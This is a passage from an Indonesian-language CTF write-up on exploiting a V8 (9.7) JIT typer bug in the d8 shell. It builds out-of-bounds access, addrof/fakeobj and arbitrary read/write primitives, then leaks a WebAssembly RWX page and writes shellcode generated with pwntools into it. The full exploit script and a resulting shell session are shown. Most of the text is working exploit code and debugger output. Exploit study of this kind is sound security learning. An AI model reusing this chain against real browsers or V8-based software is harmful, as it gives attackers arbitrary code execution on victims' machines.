Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Float_arr_map: 0x8203ae1
Obj_arr_map: 0x8203b31
Arr2: 0x8095209
0x19c808095209 <JSArray[4]>
V8 version 9.7.0 (candidate)

pwndbg> x/10gx 0x19c808095209-1
0x19c808095208:	0x0800222d08203ae1	0x0000000808095221
0x19c808095218:	0x081d2f3d08005da5	0x0000000808002a95
0x19c808095228:	0x0000000008203ae1	0x3ff199999999999a
0x19c808095238:	0x3ff3333333333333	0x3ff4cccccccccccd
0x19c808095248:	0x00000002080029cd	0x0000000008203ae1
```
Misal kita ingin leak address `0x19c808095208` maka value yang perlu kita ubah pada arr2[1] adalah `0x808095208-7`.<br>
```js
d8> arr2[1] = itof(BigInt(0x808095208-7));
1.704258048e-313

pwndbg> x/10gx 0x19c808095209-1
0x19c808095208:	0x0800222d08203ae1	0x0000000808095221
0x19c808095218:	0x081d2f3d08005da5	0x0000000808002a95
0x19c808095228:	0x0000000008203ae1	0x0000000808095201*
0x19c808095238:	0x3ff3333333333333	0x3ff4cccccccccccd
0x19c808095248:	0x00000002080029cd	0x0000000008203ae1

d8> "0x"+ftoi(fake[0]).toString(16);
"0x800222d08203ae1"
```
See dengan ini kita bisa leak address apapun yang terdapat pada heap dari v8.
Untuk ARW pun sama kita tinggal lakukan `fake[0] = value` maka fakeobj yang kita lakukan akan mengoverwrite address dari `0x19c808095208`.<br>
Alright dengan ini kita bisa bikin fungsi seperti ini.
```js
function arb_read(addr){
    if(addr % 2n == 0)
        addr += 1n;

    arr2[1] = itof((8n << 32n) + addr - 8n);
    return fake[0];
}

function arb_write(addr, val){
    if(addr % 2n == 0)
        addr += 1n;
    arr2[1] = itof((8n << 32n) + (addr)-8n);
    fake[0] = itof(BigInt(val));
}
```

## Gain Shell
ALRIGHT FINAL STEP! HERE GO!. Kita sudah bisa Arbitary Read/Write, selanjutnya kita akan melakukan leak address dari **wasm** pada v8 itu sendiri. 
Agar kita bisa mendapatkan address RWX pada v8, kita bisa menggunakan **WebAssembly**. Scriptnya seperti ini. <br>
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
```
Script ini akan membuat address RWX pada v8, hal yang perlu kita lakukan adalah leak address tersebut. Oke pertama2 kita run terlebih dahulu script tadi melalui gdb.<br>
![Quick9](/assets/images/quickmaffs/quick9.png)
Bisa kita lihat terdapat address rwx, nah bagaimana kita leak nya?, address tersebut terdapat didalam **wasm_instance**
```js
pwndbg> c
Continuing.
%DebugPrint(wasm_instance);
0x3edb081d2001 <Instance map = 0x3edb08205409>
[object WebAssembly.Instance]

pwndbg> x/4gx 0x3edb081d2001-1+0x60
0x3edb081d2060:	0x00000c1ff2d3a000	0x00005555566e9808
0x3edb081d2070:	0x00005555566e9800	0x00005555566e9ee8
```
Bisa kita lihat terdapat address RWX pada **wasm_instance+0x60** oke dengan ini kita bisa lakukan leak.<br>
```js
var arr2 = [itof(float_arr_map), 1.1, 1.2, 1.3];
console.log("Arr2: 0x"+addrof(arr2).toString(16));
%DebugPrint(arr2);
var fake = fakeobj((addrof(arr2)+0x20n));

function arb_read(addr){
    if(addr % 2n == 0)
        addr += 1n;

    arr2[1] = itof((8n << 32n) + addr - 8n);
    return fake[0];
}

function arb_write(addr, val){
    if(addr % 2n == 0)
        addr += 1n;
    arr2[1] = itof((8n << 32n) + (addr)-8n);
    fake[0] = itof(BigInt(val));
}

var test_addr = addrof(wasm_instance)+0x60n;
var rwx_page_addr = ftoi(arb_read(test_addr));
console.log("ADDRESS RWX: 0x"+(rwx_page_addr).toString(16));

pwndbg> run --allow-natives-syntax --shell test.js 
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Float_arr_map: 0x8203ae1
Obj_arr_map: 0x8203b31
Arr2: 0x82f0989
0x2460082f0989 <JSArray[4]>
ADDRESS RWX: 0x3ef1edc31000
V8 version 9.7.0 (candidate)
```
Kita check di vmmap
![Quick10](/assets/images/quickmaffs/quick10.png)
BOOM!!! Kita berhasil leak address dari RWX, selanjutnya tinggal write shellcode kedalam situ. Gimana caranya? Bisa pakai fungsi ini

```js
function copy_shellcode(addr2, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrof(buf2);
    let backing_store_addr = buf_addr + 0x14n+0x8n;
    //%DebugPrint(backing_store_addr);
    arb_write(backing_store_addr, addr2);
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}
```

Saya tidak akan menjelaskan secara detail fungsi tersebut seperti apa, karena kita tinggal copas saja dari CVE yang ada digithub contohnya [ini](https://github.com/r4j0x00/exploits/blob/master/chrome-patch-gap/exploit.js). Hal yang beda hanyalah offset dari **backing_store_addr** tinggal debug saja di GDB, semangat!

Ohya karena payload shellcode di v8 berbeda, maka saya buat script python untuk generate payload seperti berikut
```py
from pwn import *

context.arch = 'amd64'
sc = asm(shellcraft.sh())
print([u32(sc[i:i+4].ljust(4, b'\x00')) for i in range(0, len(sc), 4)])
#[3091753066, 1852400175, 1932472111, 3884533840, 23687784, 607420673, 16843009, 1784084017, 21519880, 2303219430, 1792160230, 84891707];
```

Full script

```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    v = Math.abs(v);
    v += 2;
    v >>= 1;
    v += 10;
    var arr = new Array(v);
    arr[0] = 1.1;
    return arr;
}


for (let i = 0; i < 100000; i++) 
    foo();

var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));
console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));

function addrof(k){
    obj_arr[0] = k;
    oob[21] = itof(float_arr_map << 32n);
    let res = obj_arr[0];
    oob[21] = itof(obj_arr_map << 32n);
    return ftoi(res) & 0xffffffffn;
}

function fakeobj(k){
    float_arr[0] = itof(k);
    oob[31] = itof(obj_arr_map);
    let fake = float_arr[0];
    oob[31] = itof(float_arr_map);
    return fake;
}

var arr2 = [itof(float_arr_map), 1.1, 1.2, 1.3];
console.log("Arr2: 0x"+addrof(arr2).toString(16));
var fake = fakeobj((addrof(arr2)+0x20n));

function arb_read(addr){
    if(addr % 2n == 0)
        addr += 1n;

    arr2[1] = itof((8n << 32n) + addr - 8n);
    return fake[0];
}

function arb_write(addr, val){
    if(addr % 2n == 0)
        addr += 1n;
    arr2[1] = itof((8n << 32n) + (addr)-8n);
    fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr2, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrof(buf2);
    let backing_store_addr = buf_addr + 0x14n+0x8n;
    //%DebugPrint(backing_store_addr);
    arb_write(backing_store_addr, addr2);
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var test_addr = addrof(wasm_instance)+0x60n;
var rwx_page_addr = ftoi(arb_read(test_addr));
console.log("ADDRESS RWX: 0x"+(rwx_page_addr).toString(16));
var shellcode = [3091753066, 1852400175, 1932472111, 3884533840, 23687784, 607420673, 16843009, 1784084017, 21519880, 2303219430, 1792160230, 84891707];
copy_shellcode(rwx_page_addr, shellcode);
f();
```

Jangan lupa hapus semua `%Debug` nya.
```js
linuz@linz:~/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release$ ./d8 test.js 
Float_arr_map: 0x8203ae1
Obj_arr_map: 0x8203b31
Arr2: 0x82d8da9
ADDRESS RWX: 0x35a8afa8e000
$ whoami
linuz
$ id
uid=1000(linuz) gid=1000(linuz) groups=1000(linuz),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),998(docker)
$ 
```